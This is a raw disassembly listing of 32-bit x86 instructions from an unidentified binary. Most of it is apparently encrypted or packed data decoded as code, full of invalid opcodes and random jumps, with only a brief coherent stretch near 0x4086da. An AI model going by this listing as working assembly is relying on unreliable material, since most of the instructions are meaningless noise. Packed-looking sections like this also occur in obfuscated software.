  408108:	pop    ecx
  408109:	inc    eax
  40810a:	fbld   TBYTE PTR [ebx+0x63]
  40810d:	dec    edx
  40810e:	jne    0x408145
  408110:	sub    BYTE PTR [ebp+0x195dc1f],al
  408116:	ds in  al,dx
  408118:	jno    0x4080b7
  40811a:	xor    al,0xb9
  40811c:	sbb    DWORD PTR [edi-0x59cb94f8],esi
  408122:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408123:	mov    eax,0xb16c6bd6
  408128:	jno    0x4081a1
  40812a:	jmp    0x158439e9
  40812f:	aad    0xca
  408131:	push   0xf0b98ca3
  408136:	pop    ds
  408137:	scas   al,BYTE PTR es:[edi]
  408138:	int3   
  408139:	add    dl,cl
  40813b:	xchg   edx,eax
  40813c:	cmp    ch,bh
  40813e:	sub    bh,BYTE PTR [ecx+0x27]
  408141:	dec    esp
  408142:	test   al,0xeb
  408144:	leave  
  408145:	fidiv  WORD PTR [ecx+0x7]
  408148:	and    DWORD PTR [esi+0x73840df8],0x2e
  40814f:	inc    eax
  408150:	not    BYTE PTR [edi+0xcf541c2]
  408156:	not    BYTE PTR [edi+0x47dee515]
  40815c:	xor    dl,BYTE PTR [ebp-0x5b]
  40815f:	sub    edi,DWORD PTR [ebp+0x40939e46]
  408165:	pop    es
  408166:	adc    cl,dl
  408168:	enter  0xda80,0x86
  40816c:	xchg   ecx,ebp
  40816e:	mul    dh
  408170:	adc    ebx,ebp
  408172:	jae    0x40813d
  408174:	sbb    al,0x41
  408176:	fmul   DWORD PTR [ebx+ebp*8+0x48]
  40817a:	jecxz  0x408184
  40817c:	lods   al,BYTE PTR ds:[esi]
  40817d:	in     eax,dx
  40817e:	adc    esi,edi
  408180:	xchg   edi,eax
  408181:	jb     0x408133
  408183:	dec    esp
  408184:	test   al,0x82
  408186:	mov    eax,0x704a3132
  40818b:	jle    0x4081bc
  40818d:	fwait
  40818e:	stc    
  40818f:	inc    esi
  408190:	add    DWORD PTR [ebx],edi
  408192:	popf   
  408193:	jmp    0xe8dd:0xdc033af9
  40819a:	add    bl,cl
  40819c:	(bad)  
  40819d:	out    0xb5,eax
  40819f:	inc    eax
  4081a0:	xlat   BYTE PTR ds:[ebx]
  4081a1:	mov    bh,0x1e
  4081a3:	or     esp,0x4f
  4081a6:	xor    bh,BYTE PTR [esp+esi*4-0x73]
  4081aa:	mov    ebp,0x219056a0
  4081af:	mov    bh,BYTE PTR [ecx]
  4081b1:	out    0xdf,eax
  4081b3:	(bad)  
  4081b4:	adc    eax,0x5e5412da
  4081b9:	inc    esp
  4081ba:	int3   
  4081bb:	push   ds
  4081bc:	jecxz  0x40814d
  4081be:	push   edi
  4081bf:	and    ch,bl
  4081c1:	mov    bl,0x6e
  4081c3:	loopne 0x4081b6
  4081c5:	jmp    0x298b46bc
  4081ca:	pop    esp
  4081cb:	and    al,0x36
  4081cd:	loop   0x408207
  4081cf:	dec    eax
  4081d0:	mov    dl,0xf8
  4081d2:	lock add al,cl
  4081d5:	xor    DWORD PTR [eax*4+0x3afdd85e],esp
  4081dc:	int    0xd4
  4081de:	xor    edi,DWORD PTR [eax+eiz*4-0x1f4e34bc]
  4081e5:	inc    edx
  4081e6:	push   0x89a6094d
  4081eb:	and    al,0xc2
  4081ed:	sub    esi,DWORD PTR [edx]
  4081ef:	fidivr WORD PTR [ebx+0x3a]
  4081f2:	sbb    cl,BYTE PTR [ebx-0x13823f8f]
  4081f8:	dec    esp
  4081f9:	js     0x40821c
  4081fb:	mov    DWORD PTR [eax+0x3b],ebp
  4081fe:	cs mov al,0xee
  408201:	push   ecx
  408202:	into   
  408203:	test   al,0xaf
  408205:	loopne 0x4081b9
  408207:	inc    esp
  408208:	hlt    
  408209:	ins    BYTE PTR es:[edi],dx
  40820a:	adc    eax,0xc4d5dc35
  40820f:	jb     0x40827f
  408211:	jnp    0x408214
  408213:	(bad)  
  408214:	jge    0x408229
  408216:	dec    esp
  408217:	in     eax,dx
  408218:	inc    esp
  408219:	mov    edi,0x7cbb180a
  40821e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40821f:	sti    
  408220:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408221:	scas   eax,DWORD PTR es:[edi]
  408222:	or     DWORD PTR [eax],esp
  408224:	dec    edi
  408225:	mov    al,0x74
  408227:	call   0x2d38:0x400e6ff8
  40822e:	adc    eax,0xccbea9f6
  408233:	mov    ch,BYTE PTR [esp+eax*1-0x20]
  408237:	pop    es
  408238:	fwait
  408239:	outs   dx,DWORD PTR ds:[esi]
  40823a:	loopne 0x40820c
  40823c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40823d:	inc    ecx
  40823e:	or     eax,0x11abca51
  408243:	sbb    BYTE PTR [esp+0x1a],0x72
  408248:	cmc    
  408249:	arpl   WORD PTR [edi],cx
  40824b:	adc    DWORD PTR ds:0xf1286fc4,esi
  408251:	jp     0x408216
  408253:	mov    esi,0xb64948c0
  408258:	dec    ebx
  408259:	sbb    DWORD PTR [ebx+eiz*4],ebp
  40825c:	pop    ss
  40825d:	mov    bl,0x42
  40825f:	fsubr  QWORD PTR [edi]
  408261:	mov    esi,0x75be1016
  408266:	sub    DWORD PTR [ecx+0x76],ebx
  408269:	aam    0x9b
  40826b:	push   esp
  40826c:	cmp    BYTE PTR [edx],bh
  40826e:	cdq    
  40826f:	xchg   ebx,eax
  408270:	mov    bl,0x25
  408272:	shl    BYTE PTR [esp+eax*2-0x6a],0x40
  408277:	push   esi
  408278:	clc    
  408279:	adc    BYTE PTR [edx+0x62],0xc8
  40827d:	sbb    ch,dl
  40827f:	adc    al,0xfc
  408281:	pushf  
  408282:	js     0x40824b
  408284:	mov    edx,0xd57d1b43
  408289:	ds push ebx
  40828b:	sbb    BYTE PTR [ebp-0x2d],0x9b
  40828f:	in     al,dx
  408290:	inc    edi
  408291:	int3   
  408292:	mov    ch,0x68
  408294:	int    0xd1
  408296:	pop    ss
  408297:	mov    esi,0x5e366c32
  40829c:	push   ss
  40829d:	les    esp,FWORD PTR [edx+0x16]
  4082a0:	sbb    eax,0x9fdd34ac
  4082a5:	pop    esp
  4082a6:	out    0xe,eax
  4082a8:	and    al,0xf4
  4082aa:	sbb    BYTE PTR [eax+0x3290f19e],bl
  4082b0:	outs   dx,BYTE PTR ds:[esi]
  4082b1:	leave  
  4082b2:	mov    eax,ds:0x345a8fe3
  4082b7:	lea    ebx,[ebx]
  4082b9:	outs   dx,DWORD PTR ds:[esi]
  4082ba:	dec    esi
  4082bb:	mov    eax,ds:0xfc5b5754
  4082c0:	mov    ebx,DWORD PTR [edi-0x55551d78]
  4082c6:	in     al,0x79
  4082c8:	inc    edi
  4082c9:	cmp    DWORD PTR [edi-0x2b],eax
  4082cc:	ins    BYTE PTR es:[edi],dx
  4082cd:	jg     0x408295
  4082cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4082d0:	rol    bl,0x14
  4082d3:	ror    DWORD PTR [ecx+0x25576ca1],1
  4082d9:	pop    ebp
  4082da:	cmc    
  4082db:	loope  0x408261
  4082dd:	mov    ebx,0xf8b59e0d
  4082e2:	cdq    
  4082e3:	mov    ah,0x83
  4082e5:	mov    esi,DWORD PTR gs:[ebx+0x72]
  4082e9:	adc    DWORD PTR [ebp+0x42f85fbb],ebp
  4082ef:	ret    0x1ae9
  4082f2:	or     bl,BYTE PTR [ebp-0x8]
  4082f5:	or     BYTE PTR [eax+esi*8],bl
  4082f8:	pop    ds
  4082f9:	fimul  WORD PTR ds:0x4aeee911
  4082ff:	cmp    esi,esi
  408301:	(bad)  
  408303:	cs or  eax,0xa33462b0
  408309:	xor    ebx,eax
  40830b:	add    eax,DWORD PTR [ebp+0x54]
  40830e:	stos   BYTE PTR es:[edi],al
  40830f:	out    dx,eax
  408310:	mov    ds:0xfd9cc9d5,al
  408315:	test   BYTE PTR [edx+0x148e1b50],bh
  40831b:	xrelease xchg BYTE PTR [ebp-0x27ac61c],ah
  408322:	mov    bl,0x56
  408324:	and    ebx,DWORD PTR [eax]
  408326:	dec    edi
  408327:	jecxz  0x408399
  408329:	adc    DWORD PTR [ebp+0x4ae7c6c6],edi
  40832f:	adc    ebx,DWORD PTR [edx]
  408331:	jmp    0x3d9b:0x7ff2beb9
  408338:	xor    DWORD PTR [ebp-0x1c],ebx
  40833b:	pushf  
  40833c:	sub    eax,0x486c871a
  408341:	mov    eax,0x4ad74e30
  408346:	mov    cl,0xf3
  408348:	add    al,0xd7
  40834a:	mov    ebx,0x3e2084fc
  40834f:	es dec esi
  408351:	mov    dl,0xa0
  408353:	call   0x4d863a1c
  408358:	cmp    esp,eax
  40835a:	stc    
  40835b:	push   ebp
  40835c:	ins    BYTE PTR es:[edi],dx
  40835d:	add    al,0x99
  40835f:	sub    ebx,DWORD PTR [ebx+0x4be2239a]
  408365:	and    bl,BYTE PTR [edx]
  408367:	push   esi
  408368:	sbb    DWORD PTR [edx],esi
  40836a:	icebp  
  40836b:	xor    ecx,edx
  40836d:	cmp    eax,0x1d666f01
  408372:	or     ah,BYTE PTR [eax+edx*2+0x23]
  408376:	push   eax
  408377:	push   esp
  408378:	ror    BYTE PTR [eax-0x2f],1
  40837b:	push   edx
  40837c:	mov    al,ds:0xf83f3896
  408381:	xor    al,0x8
  408383:	mov    ebp,DWORD PTR [ebx]
  408385:	rol    bl,cl
  408387:	inc    ecx
  408388:	sbb    BYTE PTR [edx],dl
  40838a:	(bad)
  40838d:	push   edi
  40838e:	sub    al,0x83
  408390:	dec    esp
  408391:	push   eax
  408392:	adc    ah,BYTE PTR [esi]
  408394:	aam    0xa3
  408396:	mov    al,0x34
  408398:	inc    ebp
  408399:	mov    dl,0xcb
  40839b:	jb     0x408375
  40839d:	int    0x43
  40839f:	fldcw  WORD PTR [ebx]
  4083a1:	dec    esi
  4083a2:	inc    BYTE PTR [ebx-0x76b9142c]
  4083a8:	and    BYTE PTR [eax+0x39dd1621],bl
  4083ae:	pushf  
  4083af:	and    cl,cl
  4083b1:	jp     0x40841d
  4083b3:	mov    edx,edi
  4083b5:	mov    bh,0x1f
  4083b7:	fidiv  DWORD PTR [edi]
  4083b9:	rol    DWORD PTR [edi+0xa],1
  4083bc:	xchg   edi,eax
  4083bd:	lahf   
  4083be:	sti    
  4083bf:	cmp    edi,DWORD PTR [edi-0x257909a]
  4083c5:	nop
  4083c6:	sbb    al,0xe6
  4083c8:	stc    
  4083c9:	scas   al,BYTE PTR es:[edi]
  4083ca:	bnd js 0x408356
  4083cd:	add    DWORD PTR [edx+esi*8],ecx
  4083d0:	or     eax,0x6f8523c9
  4083d5:	pushf  
  4083d6:	in     eax,0x92
  4083d8:	cmp    al,al
  4083da:	(bad)  
  4083db:	mov    dl,0x1f
  4083dd:	xor    eax,0x2b4b70a1
  4083e2:	or     al,0xc4
  4083e4:	mov    WORD PTR [edx-0x34],fs
  4083e7:	add    DWORD PTR [ecx],0xffffffd2
  4083ea:	jbe    0x40845b
  4083ec:	mov    ah,0xd6
  4083ee:	fnstenv [ecx+esi*8-0x31aae333]
  4083f5:	inc    ecx
  4083f6:	add    ch,BYTE PTR [edx+0x31a05203]
  4083fc:	sbb    eax,edx
  4083fe:	lods   eax,DWORD PTR ds:[esi]
  4083ff:	sub    BYTE PTR [edi],al
  408401:	repz xor BYTE PTR [esi-0x447e07b0],bh
  408408:	icebp  
  408409:	xor    edx,DWORD PTR [ebx+0x70ef7b12]
  40840f:	sbb    eax,0xfa5ea1a3
  408414:	sbb    bh,BYTE PTR [eax-0x37]
  408417:	mov    cl,0x7a
  408419:	je     0x4083f9
  40841b:	jnp    0x40849b
  40841d:	fnstsw WORD PTR [ebp-0xc]
  408420:	shl    BYTE PTR [ecx],1
  408422:	aad    0x1b
  408424:	ds xchg esi,eax
  408426:	xchg   edx,eax
  408427:	dec    edi
  408428:	add    dl,BYTE PTR [eax-0x64]
  40842b:	fldenv [edi+0x394a2ed0]
  408431:	mov    ah,0x65
  408433:	mov    WORD PTR [ecx-0x16],?
  408436:	pushf  
  408437:	pop    ss
  408438:	loopne 0x408426
  40843a:	leave  
  40843b:	xor    DWORD PTR [eax-0x1f],ecx
  40843e:	push   0x67
  408440:	(bad)  
  408441:	(bad)  
  408442:	in     eax,0x1e
  408444:	pusha  
  408445:	sahf   
  408446:	sub    eax,0x96cacac9
  40844b:	dec    BYTE PTR [edx-0x18]
  40844e:	stos   BYTE PTR es:[edi],al
  40844f:	inc    ebx
  408450:	std    
  408451:	dec    edx
  408452:	sbb    al,0xfa
  408454:	loop   0x4084be
  408456:	scas   al,BYTE PTR es:[edi]
  408457:	push   ss
  408458:	push   esi
  40845a:	cmp    cl,bl
  40845c:	test   bl,dh
  40845e:	sbb    al,0x16
  408460:	adc    eax,ecx
  408462:	pop    eax
  408463:	dec    ecx
  408464:	jp     0x408475
  408466:	es sbb eax,0x767b7ad9
  40846c:	test   al,0xc8
  40846e:	push   cs
  40846f:	inc    ebx
  408470:	cmc    
  408471:	jl     0x4084bb
  408473:	mov    dl,0xa5
  408475:	ins    BYTE PTR es:[edi],dx
  408476:	xlat   BYTE PTR ds:[ebx]
  408477:	lock add DWORD PTR cs:[ebp+0x51],ebx
  40847c:	jbe    0x4084f9
  40847e:	scas   eax,DWORD PTR es:[edi]
  40847f:	aam    0x63
  408481:	test   ch,bh
  408483:	repnz pop ecx
  408485:	cli    
  408486:	jge    0x40847c
  408488:	arpl   ax,ax
  40848a:	pop    ebp
  40848b:	neg    DWORD PTR [ecx]
  40848d:	jecxz  0x408438
  40848f:	mov    ebx,0x79a64de8
  408494:	std    
  408495:	mov    ah,0x12
  408497:	test   eax,ebp
  408499:	in     al,dx
  40849a:	dec    esi
  40849b:	in     eax,0x45
  40849d:	repnz test eax,0xc3fe7646
  4084a3:	sub    BYTE PTR [edx+0x165b63e3],ch
  4084a9:	loope  0x408487
  4084ab:	mov    DWORD PTR [ebp+0x31],0x97bac7f5
  4084b2:	add    eax,esi
  4084b4:	xchg   esp,eax
  4084b5:	ficom  DWORD PTR [eax-0x38]
  4084b8:	pushf  
  4084b9:	jnp    0x408523
  4084bb:	cld    
  4084bc:	mov    eax,ds:0xcda054a9
  4084c1:	mov    ah,0xe0
  4084c3:	mov    edi,0x2e1c7dff
  4084c8:	popa   
  4084c9:	dec    esp
  4084ca:	mov    DWORD PTR ds:0x8bb1d577,0x67bcd9af
  4084d4:	outs   dx,DWORD PTR ds:[esi]
  4084d5:	and    eax,0x4d4cb21
  4084da:	fs xchg esp,eax
  4084dc:	fild   QWORD PTR ds:0x393ad235
  4084e2:	ss cmp eax,0x8f405771
  4084e8:	and    bl,ch
  4084ea:	retf   0x79fd
  4084ed:	inc    ecx
  4084ee:	dec    ebp
  4084ef:	jns    0x4084c6
  4084f1:	cdq    
  4084f2:	div    DWORD PTR [edi+0x15]
  4084f5:	dec    ebp
  4084f6:	xchg   ecx,eax
  4084f7:	xor    al,0x55
  4084f9:	cmp    ch,cl
  4084fb:	ins    DWORD PTR es:[edi],dx
  4084fc:	xor    dh,bh
  4084fe:	pusha  
  4084ff:	addr16 (bad) 
  408501:	sbb    DWORD PTR [ebp+0x7b],eax
  408504:	test   eax,0xa91ab724
  408509:	pop    edx
  40850a:	mov    eax,ds:0x486ed738
  40850f:	push   esi
  408510:	(bad)  
  408511:	cld    
  408512:	mov    edi,0xf6c94dcb
  408517:	cli    
  408518:	lds    esi,FWORD PTR [eax-0x43]
  40851b:	sub    ch,BYTE PTR [edx+0x21]
  40851e:	mov    ecx,esi
  408520:	mov    eax,0x26ab4145
  408525:	cmp    eax,0x7330796f
  40852a:	jp     0x40854b
  40852c:	mov    dh,0xd3
  40852e:	dec    edx
  40852f:	out    0x15,al
  408531:	xchg   ch,dl
  408533:	dec    ebx
  408534:	pop    ebp
  408535:	hlt    
  408536:	lods   eax,DWORD PTR ds:[esi]
  408537:	jns    0x40854c
  408539:	cwde   
  40853a:	ror    BYTE PTR [ecx],1
  40853c:	aaa    
  40853d:	out    0xe4,al
  40853f:	and    ecx,DWORD PTR [esi-0x55f43064]
  408545:	popa   
  408546:	pushfw 
  408548:	ins    BYTE PTR es:[edi],dx
  408549:	dec    edi
  40854a:	xor    eax,0x2f4d01c6
  40854f:	pop    edx
  408550:	jbe    0x4084dc
  408552:	test   al,0x28
  408554:	sbb    ch,BYTE PTR [edi]
  408556:	mov    al,ds:0xf40687c5
  40855b:	mov    ebx,0x30dc1544
  408560:	clc    
  408561:	int3   
  408562:	test   ah,ch
  408564:	iret   
  408565:	adc    dh,BYTE PTR [eax+0x1f700dd2]
  40856b:	and    DWORD PTR [ebx],esi
  40856d:	or     BYTE PTR [ebx+ecx*2-0x1d],dh
  408571:	icebp  
  408572:	or     al,0xa4
  408574:	ins    BYTE PTR es:[edi],dx
  408575:	ins    DWORD PTR es:[edi],dx
  408576:	cmc    
  408577:	jae    0x40859b
  408579:	or     al,0xc0
  40857b:	xchg   bl,cl
  40857d:	popa   
  40857e:	xchg   ebx,ebp
  408580:	pop    edi
  408581:	adc    DWORD PTR [ecx],esp
  408583:	cmp    dh,dl
  408585:	and    eax,0x5da2c262
  40858a:	(bad)  
  40858b:	pop    ds
  40858c:	push   edi
  40858d:	pop    ecx
  40858e:	call   0x825f:0x20fe3494
  408595:	inc    ecx
  408596:	int3   
  408597:	adc    dl,cl
  408599:	pop    es
  40859a:	xor    esi,DWORD PTR [edi+0x3927bc17]
  4085a0:	int    0xe
  4085a2:	mov    ds:0x9fc1ec63,eax
  4085a7:	test   eax,0x691bd8d0
  4085ac:	mov    esp,0xf6b4a798
  4085b1:	jmp    0xb1dd:0xf20b69a7
  4085b8:	outs   dx,BYTE PTR ds:[esi]
  4085b9:	sbb    BYTE PTR [eax+0x3aa60d77],al
  4085bf:	mov    dl,0x8e
  4085c1:	sbb    eax,0x3bfaea7d
  4085c6:	fmul   st,st(0)
  4085c8:	jnp    0x40862f
  4085ca:	sub    ecx,DWORD PTR [eax+eax*8+0x7ffe4c0c]
  4085d1:	mul    ebp
  4085d3:	fild   WORD PTR [edi-0x30]
  4085d6:	jbe    0x4085f4
  4085d8:	sbb    al,0x36
  4085da:	jns    0x40858c
  4085dc:	cmp    edi,DWORD PTR [ecx+0x70]
  4085df:	cmp    dh,BYTE PTR [ecx+0x54]
  4085e2:	lock xchg edx,eax
  4085e4:	pop    ebp
  4085e5:	pop    ebx
  4085e6:	adc    eax,0x64d6f656
  4085eb:	stos   DWORD PTR es:[edi],eax
  4085ec:	aam    0xf6
  4085ee:	mov    cl,0x2e
  4085f0:	aaa    
  4085f1:	test   al,0xb3
  4085f3:	pop    esi
  4085f4:	lahf   
  4085f5:	mov    esi,0xdd76aa47
  4085fa:	out    dx,eax
  4085fb:	out    0xdf,eax
  4085fd:	nop
  4085fe:	pusha  
  4085ff:	xor    eax,DWORD PTR [ebp+eax*1-0x4b]
  408603:	mov    ah,BYTE PTR [edi-0x7988d066]
  408609:	sbb    DWORD PTR [ebp+0x66a3a3f1],ecx
  40860f:	enter  0x38bb,0xdf
  408613:	push   0x552e69ee
  408618:	mov    fs,WORD PTR [ebp-0x7eae412e]
  40861e:	push   ebx
  40861f:	cmp    BYTE PTR [esi],bh
  408621:	adc    eax,0xc91c2aef
  408626:	add    esi,ecx
  408628:	add    DWORD PTR [esi],ebp
  40862a:	sub    eax,0xc6bff94c
  40862f:	pop    eax
  408630:	aaa    
  408631:	fdivr  DWORD PTR [edx]
  408633:	jno    0x408686
  408635:	test   eax,0x69e94327
  40863a:	int3   
  40863b:	cs xchg edx,eax
  40863d:	mov    dl,0xf4
  40863f:	adc    ebx,ebp
  408641:	outs   dx,BYTE PTR ds:[esi]
  408642:	jle    0x408640
  408644:	(bad)  
  408645:	loop   0x408670
  408647:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408648:	int3   
  408649:	xor    BYTE PTR [ebx-0x41],ch
  40864c:	push   ebx
  40864d:	jg     0x40867e
  40864f:	cmp    DWORD PTR [ebp-0x37],eax
  408652:	fidivr WORD PTR [edi+eiz*8+0x3f]
  408656:	ins    DWORD PTR es:[edi],dx
  408657:	fs pop edx
  408659:	dec    edi
  40865a:	test   al,0x6e
  40865c:	out    dx,al
  40865d:	mov    DWORD PTR [edi+0x23],esp
  408660:	pop    esi
  408661:	add    al,0xa
  408663:	lods   al,BYTE PTR ds:[esi]
  408664:	xor    edx,DWORD PTR [ecx+eiz*8+0x2e74a95f]
  40866b:	add    eax,0x479b7bf9
  408670:	lds    edx,FWORD PTR [edi-0x6243d9d]
  408676:	int    0x5a
  408678:	rcr    edx,cl
  40867a:	xor    edx,ecx
  40867c:	out    0xf2,al
  40867e:	inc    ebx
  40867f:	push   0xaa1190cd
  408684:	mov    ebp,0x14cbedc0
  408689:	pop    ss
  40868a:	dec    ecx
  40868b:	std    
  40868c:	shl    DWORD PTR [edi+edi*8-0x9],cl
  408690:	jmp    0x36868e1d
  408695:	mov    ebp,0xf2d25a36
  40869a:	dec    esi
  40869b:	cmp    dh,BYTE PTR [edi]
  40869d:	xchg   esp,eax
  40869e:	fisubr WORD PTR [esi+0x1b26a28e]
  4086a4:	and    DWORD PTR [edx],0xffffff97
  4086a7:	xchg   esi,eax
  4086a8:	cmp    DWORD PTR [ecx+0x5b],edi
  4086ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4086ac:	ins    BYTE PTR es:[edi],dx
  4086ad:	push   ebp
  4086ae:	fild   WORD PTR [esi+0xad7f8f4]
  4086b4:	sub    BYTE PTR [ecx-0x31],dl
  4086b7:	sar    BYTE PTR [esi+eiz*1],0xa6
  4086bb:	mov    ebx,0x2eba777e
  4086c0:	xchg   edi,eax
  4086c1:	in     eax,0x34
  4086c3:	mov    ah,0x4b
  4086c5:	mov    WORD PTR [edx-0x9e7d98c],gs
  4086cb:	stos   DWORD PTR es:[edi],eax
  4086cc:	retf   
  4086cd:	push   ebx
  4086ce:	je     0x408669
  4086d0:	in     al,0xbb
  4086d2:	test   al,0xf0
  4086d4:	inc    esp
  4086d5:	xor    al,0x54
  4086d7:	shr    BYTE PTR [edx+0x3],cl
  4086da:	xor    edx,edx
  4086dc:	pop    edx
  4086dd:	add    edx,0x8
  4086e0:	push   edx
  4086e1:	pop    ecx
  4086e2:	push   0x6
  4086e4:	dec    ecx
  4086e5:	pop    ebx
  4086e6:	dec    ebx
  4086e7:	xchg   ebx,ecx
  4086e9:	sub    ebx,ecx
  4086eb:	xchg   ebx,ecx
  4086ed:	dec    ecx
  4086ee:	mov    eax,DWORD PTR [ebp-0x1c]
  4086f1:	imul   eax,ecx
  4086f4:	sub    esp,eax
  4086f6:	mov    DWORD PTR [ebp-0x20],esp
  4086f9:	mov    eax,DWORD PTR [ebp-0x4]
  4086fc:	mov    ecx,0x7510893
  408701:	jmp    0x40aa90
  408706:	dec    edi
  408707:	mov    al,0x72
  408709:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40870a:	mov    cl,0x64
  40870c:	mov    ds:0xbf3f0e63,eax
  408711:	mov    eax,0xc3d7551b
  408716:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408717:	sbb    BYTE PTR [edx+0x62],ah
  40871a:	adc    BYTE PTR [edi+0x62],bl
  40871d:	bound  eax,QWORD PTR [ebp-0x42]
  408720:	cmove  esi,DWORD PTR ds:0x118a00c0
  408727:	arpl   WORD PTR [esi],cx
  408729:	cmp    BYTE PTR [edx+0x7cc677a2],0xb6
  408730:	xchg   ecx,eax
  408731:	ror    BYTE PTR [edx+0x50],1
  408734:	dec    eax
  408735:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408736:	sub    eax,0x539d17b8
  40873b:	mov    esp,0xf1446c6a
  408740:	addr16 (bad) 
  408742:	stos   DWORD PTR es:[edi],eax
  408743:	inc    edx
  408744:	adc    al,0x22
  408746:	call   0x2cc9:0x6c0b57b
  40874d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40874e:	jb     0x4087c2
  408750:	dec    esi
  408751:	jo     0x408700
  408753:	inc    esp
  408754:	scas   al,BYTE PTR es:[edi]
  408755:	xor    BYTE PTR [ecx-0x2aa2aa67],0x19
  40875c:	push   0x9
  40875e:	test   eax,0x3eac086c
  408763:	test   cl,dh
  408765:	add    BYTE PTR [ebx+ebx*1+0x5bae8715],dl
  40876c:	push   es
  40876d:	enter  0x7d63,0x3a
  408771:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408772:	push   ecx
  408773:	xchg   edx,eax
  408774:	mov    ah,0xdd
  408776:	ja     0x408722
  408778:	pop    ss
  408779:	call   FWORD PTR [ecx]
  40877b:	jl     0x408730
  40877d:	mov    edx,0x68a59e97
  408782:	out    dx,eax
  408783:	sub    DWORD PTR ds:0x477e9ea,esi
  408789:	xchg   esp,eax
  40878a:	push   esp
  40878b:	jae    0x408762
  40878d:	jns    0x4087ed
  40878f:	lods   eax,DWORD PTR ds:[esi]
  408790:	hlt    
  408791:	dec    eax
  408792:	inc    ecx
  408793:	adc    eax,0xa69e988
  408798:	in     eax,dx
  408799:	stos   DWORD PTR es:[edi],eax
  40879a:	retf   
  40879b:	mov    bh,0xc0
  40879d:	mov    gs,edx
  40879f:	jbe    0x40880c
  4087a1:	jnp    0x4087a8
  4087a3:	aam    0x54
  4087a5:	dec    edi
  4087a6:	xor    DWORD PTR [esi-0x3ea805ec],0xeeb575eb
  4087b0:	sahf   
  4087b1:	sbb    esp,eax
  4087b3:	sbb    al,bl
  4087b5:	mov    esi,0xa3b50dc4
  4087ba:	imul   esp,DWORD PTR [esi],0xfffffff0
  4087bd:	or     eax,0xff06106c
  4087c2:	imul   esi,DWORD PTR [ebp+eax*4-0x499a8559],0x4b
  4087ca:	lock inc esp
  4087cc:	adc    eax,0x8e0c638
  4087d1:	aam    0x2
  4087d3:	add    ah,al
  4087d5:	shl    ecx,cl
  4087d7:	aaa    
  4087d8:	xchg   ecx,eax
  4087d9:	cwde   
  4087da:	shl    DWORD PTR [esi],1
  4087dc:	mov    ds:0xa99c43b3,al
  4087e1:	sub    esp,DWORD PTR [edi+eax*4+0x3a302b5b]
  4087e8:	mov    ch,0x76
  4087ea:	ror    DWORD PTR [edi+0x1abd460c],cl
  4087f0:	push   es
  4087f1:	mov    gs,WORD PTR [ebx]
  4087f3:	add    bh,BYTE PTR [ebx]
  4087f5:	mul    BYTE PTR [esp+ebp*4-0x435863aa]
  4087fc:	test   DWORD PTR ds:0xfcd0c2aa,ecx
  408802:	dec    eax
  408803:	shl    dh,0x46
  408806:	int3   
  408807:	sub    esi,DWORD PTR ds:0xf6564f01
  40880d:	pop    esi
  40880e:	sbb    ah,bh
  408810:	xlat   BYTE PTR ds:[ebx]
  408811:	xchg   ebp,eax
  408812:	aaa    
  408813:	(bad)  
  408814:	je     0x40882f
  408816:	xchg   ebx,eax
  408817:	pop    ds
  408818:	and    esp,DWORD PTR [esi+edx*2]
  40881b:	retf   
  40881c:	mov    esi,0x8667d14f
  408821:	pop    esi
  408822:	and    DWORD PTR [ecx],edx
  408824:	jmp    0x9d3ffee2
  408829:	jbe    0x40887c
  40882b:	cdq    
  40882c:	sbb    esi,DWORD PTR [ebx]
  40882e:	iret   
  40882f:	fnstsw WORD PTR [edx+0x5f]
  408832:	ret    0xaa1c
  408835:	loope  0x40886c
  408837:	out    dx,al
  408838:	add    al,0xff
  40883a:	stos   DWORD PTR es:[edi],eax
  40883b:	int3   
  40883c:	sub    DWORD PTR [esi+0x32],0x93dad421
  408843:	adc    al,0x3a
  408845:	(bad)  
  408846:	and    al,BYTE PTR [edi-0x57]
  408849:	fwait
  40884a:	dec    ecx
  40884b:	loopne 0x40888a
  40884d:	je     0x40888d
  40884f:	push   cs
  408850:	imul   eax,DWORD PTR [esi+0x5],0xffffff92
  408854:	icebp  
  408855:	cmc    
  408856:	jmp    0x4087e7
  408858:	aad    0xce
  40885a:	leave  
  40885b:	or     DWORD PTR [ebx-0x1f],ebp
  40885e:	xor    eax,eax
  408860:	lods   eax,DWORD PTR ds:[esi]
  408861:	rcl    BYTE PTR [esi],0xee
  408864:	stc    
  408865:	xor    dh,BYTE PTR [eax]
  408867:	jl     0x4088b2
  408869:	pop    edx
  40886a:	mov    edi,0x134cc13e
  40886f:	lahf   
  408870:	mov    al,0x54
  408872:	shl    DWORD PTR [esi],0xba
  408875:	xor    al,0xca
  408877:	push   es
  408878:	push   ebx
  408879:	enter  0xe775,0xab
  40887d:	mov    dh,0xbf
  40887f:	popf   
  408880:	sub    BYTE PTR [ebp+0x6d074120],dl
  408886:	mov    fs,esi
  408888:	cmp    al,dh
  40888a:	mov    eax,0xb082b3b1
  40888f:	sub    al,0x46
  408891:	cmp    esp,DWORD PTR [edi-0x26c7ed57]
  408897:	retf   0x1290
  40889a:	mov    WORD PTR [eax+0x7bdd5e87],gs
  4088a0:	push   DWORD PTR [ebx+0x5f]
  4088a3:	jne    0x4088e2
  4088a5:	mov    DWORD PTR [eax+ecx*4-0x7229244],eax
  4088ac:	mov    cl,0xa1
  4088af:	xchg   DWORD PTR [esp+esi*8-0x31c4f91],ebx
  4088b6:	test   eax,ecx
  4088b8:	mov    ebx,gs
  4088ba:	jb     0x4088ca
  4088bc:	(bad)
  4088c0:	cld    
  4088c1:	ins    BYTE PTR es:[edi],dx
  4088c2:	and    eax,0x8a6271b
  4088c7:	and    WORD PTR [ebx+0x18804a44],si
  4088ce:	push   es
  4088cf:	cmp    al,0x8d
  4088d1:	dec    edi
  4088d2:	inc    eax
  4088d3:	hlt    
  4088d4:	mov    ah,al
  4088d6:	scas   al,BYTE PTR es:[edi]
  4088d7:	push   ss
  4088d8:	xor    ch,cl
